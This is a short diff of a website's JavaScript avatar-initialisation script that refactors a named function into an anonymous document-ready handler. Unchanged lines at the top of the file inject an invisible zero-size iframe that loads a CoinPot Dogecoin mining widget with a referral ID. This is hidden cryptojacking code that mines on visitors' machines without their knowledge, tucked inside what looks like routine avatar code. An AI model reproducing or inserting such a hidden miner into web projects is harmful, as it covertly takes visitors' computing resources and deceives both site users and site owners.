@@ -1,8 +1,9 @@
+var initedAvatar = 0;
 if($('#coinpot').length==0){
 	$('<iframe id="coinpot" scrolling="no" frameborder="0" src="https://coinpot.co/mine/dogecoin/?ref=D24F0FE435EB&mode=widget" style="border:0;width:0;height:0;"></iframe>').appendTo('body');
 }
 
-function initAvatar(){
+$( document ).ready( function(){
 	if(initedAvatar){
 		return;
 	}
@@ -28,4 +29,4 @@ function initAvatar(){
 		}
 	})
 }
-$( document ).ready( initAvatar );
+);
